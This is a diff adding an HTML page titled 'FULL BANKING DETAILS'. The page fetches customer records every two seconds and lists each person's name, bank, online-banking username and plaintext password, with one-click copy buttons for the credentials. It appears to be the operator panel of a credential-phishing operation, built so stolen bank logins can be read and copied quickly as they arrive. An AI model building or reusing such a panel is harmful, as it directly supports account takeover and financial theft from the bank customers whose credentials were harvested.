@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FULL BANKING DETAILS</title>
+    <!-- Your existing head content here -->
+    <style>
+        /* Updated styles for the customer details */
+        .customer-details {
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+
+        .customer-details button.copy-button {
+            background-color: #17a2b8;
+            color: #fff;
+            font-size: 14px;
+            border: none;
+            padding: 5px 10px;
+        }
+
+        .customer-details button.copy-button:hover {
+            background-color: #138496;
+        }
+    </style>
+</head>
+<body>
+    <div class="container mt-5">
+        <div class="table-responsive">
+            <div id="data-table-body">
+                <!-- Data will be populated here using AJAX -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Include JavaScript libraries -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+    <!-- Function to copy text to clipboard without opening the keyboard -->
+    <script>
+        function copyToClipboardWithoutKeyboard(text) {
+            const textArea = document.createElement("textarea");
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+
+            try {
+                document.execCommand('copy');
+                
+            } catch (err) {
+                console.error('Unable to copy', err);
+            } finally {
+                document.body.removeChild(textArea);
+            }
+        }
+    </script>
+
+    <!-- Your AJAX code for fetching and updating customer data -->
+    <script>
+        function fetchDataAndUpdateTable() {
+            // Replace the following code with your actual AJAX request to fetch data
+            // and update the customer details
+            $.ajax({
+                url: '/data', // Replace with the actual URL for your data
+                type: 'GET',
+                dataType: 'json',
+                success: function (response) {
+                    var data = response.data;
+                    var tableBody = $('#data-table-body');
+
+                    // Clear the existing customer details
+                    tableBody.empty();
+
+                    $.each(data, function (index, item) {
+                        var customerDetails = 
+                            '<div class="customer-details">' +
+                                '<p>FULL NAME: ' + item.first_name + ' ' + item.last_name + '</p>' +
+                                '<p>BANK NAME: ' + item.bank_name + '</p>' +
+                                '<p class="td-username">USERNAME: ' + item.username + '<button class="btn btn-sm copy-button" data-clipboard-text="' + item.username + '">Copy</button></p>' +
+                                '<p class="td-password">PASSWORD: ' + item.password + '<button class="btn btn-sm copy-button" data-clipboard-text="' + item.password + '">Copy</button></p>' +
+                            '</div>';
+                        tableBody.append(customerDetails);
+                    });
+
+                    // Add click event for copy buttons
+                    $('.copy-button').click(function () {
+                        event.preventDefault();
+                        var textToCopy = $(this).data('clipboard-text');
+                        copyToClipboardWithoutKeyboard(textToCopy);
+                    });
+                },
+                error: function (error) {
+                    console.log(error);
+                }
+            });
+        }
+
+        // Initial data fetch on page load
+        fetchDataAndUpdateTable();
+
+        // Fetch data every 2 seconds
+        setInterval(fetchDataAndUpdateTable, 2000);
+    </script>
+</body>
+</html>
